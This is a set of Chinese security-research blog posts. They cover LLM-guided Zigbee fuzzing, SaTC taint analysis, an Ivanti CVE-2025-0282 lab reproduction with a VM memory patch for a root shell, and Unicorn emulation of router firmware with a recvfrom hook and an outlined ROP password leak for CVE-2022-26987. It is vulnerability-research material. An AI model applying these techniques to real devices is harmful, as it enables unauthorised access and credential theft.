<h5 id="3-1-2-大模型增强方法"><a href="#3-1-2-大模型增强方法" class="headerlink" title="3.1.2 大模型增强方法"></a>3.1.2 大模型增强方法</h5><p>使用知识提取器提取任务相关知识，然后将其作为上下文传递给大模型，有利于后续的任务解决。</p>
<p>该工作提取<strong>协议规范</strong>作为相关知识。</p>
<p>由于一般协议规范都有良好的格式，可以通过根据不同标题、大纲来制作索引；</p>
<p>使用了<code>background-augmented prompting</code>技术，感觉就是把专业知识和问题凑到一起…</p>
<h3 id="3-2-基于LLM指导的模糊测试"><a href="#3-2-基于LLM指导的模糊测试" class="headerlink" title="3.2 基于LLM指导的模糊测试"></a>3.2 基于LLM指导的模糊测试</h3><p><strong>整体流程</strong>：</p>
<ul>
<li>使用LLM提取有效信息并根据这些信息生成种子；</li>
<li>发送到设备进行测试，获取设备响应；</li>
<li>使用LLM根据响应判断种子有效性。对于造成设备状态改变的，LLMIF会保留该输入并基于消息依赖关系构建新的种子。</li>
</ul>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317142629193" style="zoom:67%;" />

<h4 id="3-2-1-协议信息提取"><a href="#3-2-1-协议信息提取" class="headerlink" title="3.2.1 协议信息提取"></a>3.2.1 协议信息提取</h4><h5 id="消息格式"><a href="#消息格式" class="headerlink" title="消息格式"></a>消息格式</h5><p>针对消息描述可能过长的问题，该工作先划定范围，通过LLM总结协议规范指定范围的每一页，然后再合成每一页的总结描述来构成<code>&#123;message_descriptions&#125;</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">message</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leet&quot;</span>;</span><br><span class="line">  <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145032496" style="zoom:67%;" />

<h5 id="Interesting-Field-Value"><a href="#Interesting-Field-Value" class="headerlink" title="Interesting Field Value"></a>Interesting Field Value</h5><p>感兴趣的目标值，有两种：dangerous value（不合法的值），functioning value（定义功能的值）</p>
<p>如下图：Effect Identifier &#x3D; 0x00; Effect Variant &#x3D; 0x00时对应了”Fade to off in 0.8 seconds”的功能。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317144616498" style="zoom:67%;" />

<h5 id="消息头结构"><a href="#消息头结构" class="headerlink" title="消息头结构"></a>消息头结构</h5><p>提取消息头结构，和前面类似，也是提取相关bit的功能和类型</p>
<h5 id="消息依赖"><a href="#消息依赖" class="headerlink" title="消息依赖"></a>消息依赖</h5><p>该工作对消息依赖的定义：A-&gt;B，传入A消息后更新部分设备属性，在传入B消息时会进行检查这些对应属性。</p>
<p>使用了CoT方法引导LLM进行推理，构建了21609个提示词，结果成功构建了968个消息依赖关系</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145041592" style="zoom:67%;" />

<h4 id="3-2-2-种子生成"><a href="#3-2-2-种子生成" class="headerlink" title="3.2.2 种子生成"></a>3.2.2 种子生成</h4><p>为每一个消息格式定义了MID， MID &#x3D; (clusterID, cmdID)</p>
<p>生成种子时，从消息模版中挑选一类消息，然后根据其MID从上述阶段中提取的Interesting Value进行赋值，如果没有则随机赋值，组合成为种子，用于后续种子变异以及模糊测试输入。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145717099" style="zoom:67%;" />

<h4 id="3-2-3-种子变异"><a href="#3-2-3-种子变异" class="headerlink" title="3.2.3 种子变异"></a>3.2.3 种子变异</h4><p>变异器分为两类：基于数据类型和基于消息头</p>
<h5 id="基于数据类型的变异器"><a href="#基于数据类型的变异器" class="headerlink" title="基于数据类型的变异器"></a>基于数据类型的变异器</h5><ul>
<li>对于定长数据：一般为数值型，设置为极限值0,0xffff</li>
<li>对于变长数据：一般为字符串，第一字节为长度，1）增加字符串长度和对应变量长度位；2）仅修改变量长度位，可能会有不一致问题。</li>
<li>还会随机去除消息中的field来构造不合法输入</li>
</ul>
<h5 id="基于消息头的变异器"><a href="#基于消息头的变异器" class="headerlink" title="基于消息头的变异器"></a>基于消息头的变异器</h5><ul>
<li>随机指定command identifier field</li>
<li>位翻转：翻转特定比特，可能会出现解析问题</li>
</ul>
<h4 id="3-2-4-响应推理"><a href="#3-2-4-响应推理" class="headerlink" title="3.2.4 响应推理"></a>3.2.4 响应推理</h4><p>根据响应判断设备在接收输入后的状态，并据此选择是否保留输入。</p>
<p>判断是否应该保留输入的标准：</p>
<ul>
<li>输入成功执行并使得设备状态改变</li>
<li>输入造成的响应非预期。eg：不合法输入并没有导致设备返回Invalid value，而是被成功执行。</li>
</ul>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317151042282" style="zoom:67%;" />

<h4 id="3-2-5-测试集扩充"><a href="#3-2-5-测试集扩充" class="headerlink" title="3.2.5 测试集扩充"></a>3.2.5 测试集扩充</h4><p>根据上一步消息响应结果来生成新的种子。</p>
<p>具体来讲：目前已有一个测试集输入s &#x3D; [m<sub>1</sub>, …, m<sub>n</sub>]，该测试集输入后可以让设备处于特定状态，此时，如果存在m<sub>n+1</sub>满足上述提取的消息依赖关系，那么就可以将m<sub>n+1</sub>作为新的输入加进该测试集。</p>
<blockquote>
<p>注：此处论文中标明依赖关系是仅根据前一个消息来提取的，是不是可以有更好的方法，考虑m<sub>1</sub>到m<sub>n</sub>整个序列对设备造成的影响，比如应该有个设备属性集合，作消息与设备属性的映射。</p>
</blockquote>
<h4 id="3-2-6-模糊测试工具实现"><a href="#3-2-6-模糊测试工具实现" class="headerlink" title="3.2.6 模糊测试工具实现"></a>3.2.6 模糊测试工具实现</h4><p>该工作设计了两个部分：Fuzzing controller和stack controller。</p>
<ul>
<li>Fuzzing controller：LLMIF本体</li>
<li>stack controller：与Zigbee设备进行交互，与Fuzzing controller用UART串口连接</li>
</ul>
<h2 id="4-实验结果"><a href="#4-实验结果" class="headerlink" title="4. 实验结果"></a>4. 实验结果</h2><ul>
<li>相较于baseline（BOOFUZZ，Z-FUZZER，BEEHIVE，chatAFL），消息覆盖率提升55.2%，代码覆盖率提升53.9%，其中消息覆盖率达到100%。</li>
<li>挖掘了11个Zigbee设备漏洞，8个0-day，7个无法被其他fuzzer检测到。</li>
</ul>
<p>作者自己构造了模拟工具对提供源码的ZStack品牌设备进行编译插桩，进行代码覆盖率分析，由于消息覆盖率达到100%，代码覆盖率也得以有很大提升。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317160808247" style="zoom:67%;" />

<h2 id="5-优势"><a href="#5-优势" class="headerlink" title="5. 优势"></a>5. 优势</h2><ul>
<li>能够成功提取Zigbee的各类消息格式（100%）</li>
<li>显著提升了代码覆盖率（提升了53.9%）</li>
<li>更定制化地利用了LLM工具（相较于chatAFL，基于提示词工程）</li>
</ul>
<h2 id="6-不足"><a href="#6-不足" class="headerlink" title="6. 不足"></a>6. 不足</h2>]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>SaTC源码阅读</title>
    <url>/posts/1134d98d.html</url>
    <content><![CDATA[<p>阅读下SaTC的源码。<br><a href="https://github.com/NSSL-SJTU/SaTC">工作链接</a></p>
<p>主要关注<code>src</code>目录下内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">src</span><br><span class="line">|-front_anaylysise</span><br><span class="line">|-headless: ghidra脚本，用于提取sink函数等信息</span><br><span class="line">|	|-call2sink.py</span><br><span class="line">|	|-ref2share.py</span><br><span class="line">|	|-ref2sink_bof.py</span><br><span class="line">|	|-ref2sink_cmdi.py</span><br><span class="line">|	|-share2sink.py</span><br><span class="line">|	|-main.py</span><br><span class="line">|-jsparse</span><br><span class="line">|-taint_check: 基于angr、KARONTE工具的代码</span><br><span class="line">|	|-taint_analysis</span><br><span class="line">|		|-coretaint.py: 污点分析主要逻辑</span><br><span class="line">|-main.py</span><br></pre></td></tr></table></figure>


<h2 id="TODO-前端分析"><a href="#TODO-前端分析" class="headerlink" title="TODO: 前端分析"></a>TODO: 前端分析</h2><h2 id="Ghidra静态分析"><a href="#Ghidra静态分析" class="headerlink" title="Ghidra静态分析"></a>Ghidra静态分析</h2><p>逻辑主要在<code>headless</code>目录下，根据定义好的sink点分为<code>ref2share.py</code>、<code>ref2sink_bof.py</code>、<code>ref2sink_cmdi.py</code>等多种类型（这里三个文件中存在冗余，有重构空间），寻找从source到sink点的函数调用路径</p>
<h2 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h2><p>使用符号化执行来进行污点分析</p>
<p>关键数据对象：<code>CoreTaint</code><br>关键函数：<code>flat_explore</code>：</p>
<ul>
<li>符号化执行，</li>
<li>污点传播逻辑：如果函数调用存在返回值，则只污染返回值；否则污染全部的参数</li>
</ul>
<h3 id="污点传播相关代码"><a href="#污点传播相关代码" class="headerlink" title="污点传播相关代码"></a>污点传播相关代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flat_explore</span>()</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> <span class="variable language_">self</span>.get_state(next_path).history.jumpkind == <span class="string">&#x27;Ijk_Call&#x27;</span> <span class="keyword">and</span> ...</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.is_summarized():</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._follow_call() <span class="comment"># 检查是否需要跟入函数，即是否存在污点相关操作</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">in</span> : <span class="comment"># 检查函数是否在followTarget集合中，以及self._p.loader.main_object.plt.values</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(nargs):</span><br><span class="line">                val_arg = <span class="built_in">getattr</span>(<span class="variable language_">self</span>.get_state(next_path).regs, name)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.is_or_points_to_tainted_data(val_arg, next_path)</span><br><span class="line">                    <span class="keyword">if</span> (...):</span><br><span class="line">                        <span class="string">&quot;return something, only taint r0&quot;</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="string">&quot;taint all writable args&quot;</span></span><br><span class="line">                        cfg = getBugFindingCFG()???</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># check memset</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">pass</span>	</span><br><span class="line">					</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2025-0282漏洞复现</title>
    <url>/posts/77850813.html</url>
    <content><![CDATA[<h1 id="CVE-2025-0282漏洞复现"><a href="#CVE-2025-0282漏洞复现" class="headerlink" title="CVE-2025-0282漏洞复现"></a>CVE-2025-0282漏洞复现</h1><p><strong>实验对象</strong>：Ivanti Connect Secure 22.7R2.3</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>随便填了下IP、DNS、网关ip这些信息。。。当然要确保配置后能主机能连通。</p>
<img src="/posts/77850813/image-20250328104259497.png" class="" title="image-20250328104259497">

<img src="/posts/77850813/image-20250328104502067.png" class="" title="image-20250328104502067">

<p>成功启动：</p>
<img src="/posts/77850813/image-20250328105625193.png" class="" title="image-20250328105625193">

<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>将虚拟机暂停后，修改其内存文件中的<code>/home/bin/dsconfig.pl</code>字符串为<code>///////////////bin/sh</code>。<code>/home/bin/dsconfig.pl</code>是控制台界面执行时需要调用的脚本文件，替换后等待控制台界面超时后按“回车”，即可获取底层Shell。</p>
<img src="/posts/77850813/image-20250328110128595.png" class="" title="image-20250328110128595">

<p>等待超时后，按回车进入shell。</p>
<p>开启防火墙规则：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 8000 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>使用python启动web server下载存在漏洞附件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3 -m http.server 8080  <span class="comment"># 启动Web服务器</span></span></span><br><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点：</p>
<img src="/posts/77850813/image-20250328144645001.png" class="" title="image-20250328144645001">

<img src="/posts/77850813/image-20250328144511224.png" class="" title="image-20250328144511224">

<p>由于虚拟机web程序每次运行启动后libc地址可能发生变化，需要使用gdb查看libc地址，然后即可运行poc实现任意命令执行。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://bbs.kanxue.com/thread-285510.htm">[原创]Ivanti Connect Secure栈溢出漏洞（CVE-2025-0282）分析与复现</a></li>
<li><a href="https://github.com/sfewer-r7/CVE-2025-0282">CVE-2025-0282</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>pwn protobuf环境搭建</title>
    <url>/posts/7fdebdbe.html</url>
    <content><![CDATA[<p>对protobuf类型题目的环境搭建</p>
<h2 id="安装protobuf"><a href="#安装protobuf" class="headerlink" title="安装protobuf"></a>安装protobuf</h2><p>下载：<a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
<p>根据其readme.txt安装即可</p>
<p>报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ protoc --c_out=./heapProto.h ./heap.proto</span><br><span class="line">protoc-gen-c: program not found or is not executable</span><br><span class="line">Please specify a program using absolute path or make sure the program is available in your PATH system variable</span><br><span class="line">--c_out: protoc-gen-c: Plugin failed with status code 1.</span><br></pre></td></tr></table></figure>

<p>缺少依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install protobuf-c-compiler</span><br></pre></td></tr></table></figure>

<h2 id="安装pbkt"><a href="#安装pbkt" class="headerlink" title="安装pbkt"></a>安装pbkt</h2><p>下载：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p>
<p>其readme有点搞，可能是因为版本太久没更新的缘故，apt安装需要更换为以下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br><span class="line">cd pbtk</span><br><span class="line">./gui.py</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Unicorn模拟执行RTOS固件</title>
    <url>/posts/73fe8f33.html</url>
    <content><![CDATA[<h1 id="Unicorn模拟执行RTOS固件"><a href="#Unicorn模拟执行RTOS固件" class="headerlink" title="Unicorn模拟执行RTOS固件"></a>Unicorn模拟执行RTOS固件</h1><p>unicorn是一种指令级cpu模拟器，可以支持多架构二进制程序的执行。由于RTOS固件通常难以进行调试，因此采用通过unicorn模拟器的方式来完成模拟调试。</p>
<h2 id="实验对象"><a href="#实验对象" class="headerlink" title="实验对象"></a>实验对象</h2><p>Fast 1900R设备，RTOS，ARM架构</p>
<h2 id="测试漏洞"><a href="#测试漏洞" class="headerlink" title="测试漏洞"></a>测试漏洞</h2><p>CVE-2022-26987</p>
<p>漏洞位置：</p>
<p><code>tWlanTask</code>函数中接受最大长度为3072的输入，随后调用<code>MmtAtePrase</code>函数将输入复制给长度548的栈上变量。导致存在栈溢出漏洞。</p>
<p><code>tWlanTask</code>函数：</p>
<img src="/posts/73fe8f33/image-20250320143220938.png" class="" title="image-20250320143220938">

<p><code>MmtAtePrase</code>函数：</p>
<img src="/posts/73fe8f33/image-20250320143247413.png" class="" title="image-20250320143247413">

<p>其中<code>spliter</code>相当于strcpy函数，将分隔符<code>&#39;\n&#39;</code>前的字符串复制给v11栈上变量。</p>
<h2 id="模拟片段"><a href="#模拟片段" class="headerlink" title="模拟片段"></a>模拟片段</h2><ol>
<li><p>使用binwalk，010Editor等工具查看该固件的加载基址。该固件为<code>0x40205000</code>，常见RTOS固件的加载基址如何确定可见另一篇文章</p>
</li>
<li><p>使用IDA查看<code>tWlanTask</code>函数的加载函数栈：</p>
<p>查看调用<code>tWlanTask</code>函数的<code>apps_init</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">apps_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// cc</span></span><br><span class="line">  _DWORD v6[<span class="number">4</span>]; <span class="comment">// [sp+2Ch] [bp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">6</span>]; <span class="comment">// [sp+3Ch] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="number">1079933252</span>, <span class="number">0</span>, <span class="number">8236</span>);</span><br><span class="line">  v0 = apps_wpsInit(<span class="number">1079933516</span>);</span><br><span class="line">  apps_upnpInit(v0);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v1 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">17</span>);</span><br><span class="line">  MEMORY[<span class="number">0x405E7944</span>] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="string">&quot;Unable to create wlan event socket\n&quot;</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      my_printf(v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( setsockopt(v1, <span class="number">0xFFFF</span>, <span class="number">512</span>, v7, <span class="number">4</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">    v6[<span class="number">0</span>] = <span class="number">604242448</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( bind(MEMORY[<span class="number">0x405E7944</span>], v6, <span class="number">16</span>) &lt; <span class="number">0</span> &amp;&amp; (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="string">&quot;Unable to bind wlan event socket\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">&quot;Unable to setsockopt to wlan event socket\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  apps_ateInitSock(<span class="number">1079937388</span>);</span><br><span class="line">  apps_wpsInitSock(<span class="number">1079933516</span>);</span><br><span class="line">  apps_wssInit(<span class="number">1079937384</span>);</span><br><span class="line">  bzero(<span class="number">1079933260</span>, <span class="number">256</span>);</span><br><span class="line">  MEMORY[<span class="number">0x405E7948</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x405E7944</span>] &gt; <span class="number">0</span> )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = MEMORY[<span class="number">0x405E7944</span>];</span><br><span class="line">  v3 = MEMORY[<span class="number">0x405E88CC</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (MEMORY[<span class="number">0x405E7944</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (MEMORY[<span class="number">0x405E7944</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">  v4 = (<span class="type">int</span>)v3 &lt;= MEMORY[<span class="number">0x405E7948</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (v3 &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (v3 &amp; <span class="number">0x1F</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = v3;</span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x405E896C</span>] &gt; MEMORY[<span class="number">0x405E7948</span>] )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = MEMORY[<span class="number">0x405E896C</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (MEMORY[<span class="number">0x405E896C</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (MEMORY[<span class="number">0x405E896C</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">  taskSpawn(<span class="string">&quot;tWlanTask&quot;</span>, <span class="number">160</span>, <span class="number">0</span>, <span class="number">0x4000</span>, tWlanTask, <span class="number">1079933252</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  regAppList(<span class="number">4</span>, wlanTmpHandle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其创建了监听在1060端口的udp连接socket，并使用taskSpawn函数创建该任务，其中定义了该函数栈大小为0x4000。</p>
</li>
<li><p>使用unicorn加载该固件到内存：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fast = Uc(UC_ARCH_ARM, UC_MODE_ARM)</span><br><span class="line">BASE_ADDR = <span class="number">0x40200000</span></span><br><span class="line">BASE_SIZE = <span class="number">0x300000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x40500000</span></span><br><span class="line">STACK_SIZE = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">fast.mem_map(BASE_ADDR, BASE_SIZE)</span><br><span class="line">fast.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line">fast.mem_write(BASE_ADDR, read(<span class="string">&#x27;./Fast FAC 1900R/FAC1900R千兆版 V1.0升级软件20190827_2.0.2/data_10400&#x27;</span>))</span><br><span class="line">fast.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Traceing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func_source = <span class="number">0x402CE868</span></span><br><span class="line">func_ret = <span class="number">0x402CE8D0</span></span><br><span class="line">fast.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">fast.emu_start(func_source, func_ret)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用capstone库进行反汇编辅助调试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.arm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytesToOpcodeStr</span>(<span class="params">curBytes</span>):</span><br><span class="line">    opcodeByteStr = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;&#123;:02X&#125; &#x27;</span>.<span class="built_in">format</span>(eachByte) <span class="keyword">for</span> eachByte <span class="keyword">in</span> curBytes)</span><br><span class="line">    <span class="keyword">return</span> opcodeByteStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment"># print(&quot;&gt;&gt;&gt; Traceing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))</span></span><br><span class="line">    opcodeBytes = mu.mem_read(address, BYTES_PER_LINE)</span><br><span class="line">    opcodeByteStr = bytesToOpcodeStr(opcodeBytes)</span><br><span class="line">    decodedInsnGenerator = cs.disasm(opcodeBytes, address)</span><br><span class="line">    <span class="comment"># if gSingleLineCode:</span></span><br><span class="line">    <span class="keyword">for</span> eachDecodedInsn <span class="keyword">in</span> decodedInsnGenerator:</span><br><span class="line">        eachInstructionName = eachDecodedInsn.mnemonic</span><br><span class="line">        info(<span class="string">&quot;--- 0x%08X: %s -&gt; %s\t%s&quot;</span>, address, opcodeByteStr, eachInstructionName, eachDecodedInsn.op_str)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从source点模拟执行到sink点，hook <code>recvfrom</code>函数，当执行该函数时，向目标buffer里填充payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_recvfrom</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0x402CE880</span>:</span><br><span class="line">        info(<span class="string">&quot;recvfrom hooked&quot;</span>)</span><br><span class="line">        target_addr = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        size = mu.reg_read(UC_ARM_REG_R2)</span><br><span class="line">        info(<span class="string">f&quot;ret_addr: <span class="subst">&#123;<span class="built_in">hex</span>(mu.reg_read(UC_ARM_REG_LR))&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> size &gt; <span class="built_in">len</span>(user_data):</span><br><span class="line">            size = <span class="built_in">len</span>(user_data)</span><br><span class="line">        mu.mem_write(target_addr, user_data[:size])</span><br><span class="line">        info(<span class="string">f&quot;write <span class="subst">&#123;size&#125;</span> bytes to <span class="subst">&#123;<span class="built_in">hex</span>(target_addr)&#125;</span>&quot;</span>)</span><br><span class="line">        info(<span class="string">f&quot;target_addr: <span class="subst">&#123;mu.mem_read(target_addr, size)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        mu.reg_write(UC_ARM_REG_PC, address+<span class="number">4</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R0, size)</span><br></pre></td></tr></table></figure>

<p>该漏洞利用方法为利用ROP调用<code>strncpy(group_addr, passwd_addr, 0x21)</code>函数，从而实现泄露passwd目的。</p>
<p>passwd_addr可以在<code>httpGetPassword</code>中获取到，在模拟中我们可以将该地址map为有效密码<code>0KcgeXhc9TefbwK</code>。</p>
<img src="/posts/73fe8f33/image-20250320171631953.png" class="" title="image-20250320171631953">

<p>然后通过hook <code>recvfrom</code> 函数写入payload，获取到目标密码。</p>
<img src="/posts/73fe8f33/image-20250320173044012.png" class="" title="image-20250320173044012">
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Netgear RAX30 固件分析</title>
    <url>/posts/a9bcbbe9.html</url>
    <content><![CDATA[<h2 id="分析对象"><a href="#分析对象" class="headerlink" title="分析对象"></a>分析对象</h2><ul>
<li>型号：Netgear RAX30</li>
<li>固件版本：1.0.9.92</li>
</ul>
<h2 id="CVE-2023-35722-分析"><a href="#CVE-2023-35722-分析" class="headerlink" title="CVE-2023-35722 分析"></a>CVE-2023-35722 分析</h2><blockquote>
<p>该漏洞允许网络邻近的攻击者在受影响的NETGEAR RAX30路由器上执行任意代码。利用此漏洞不需要身份验证。具体漏洞存在于UPnP端口映射请求的处理中。问题在于在使用用户提供的字符串执行系统调用之前，缺乏对其进行适当验证。攻击者可以利用此漏洞以root的身份执行代码。漏洞编号为ZDI-CAN-20429。</p>
</blockquote>
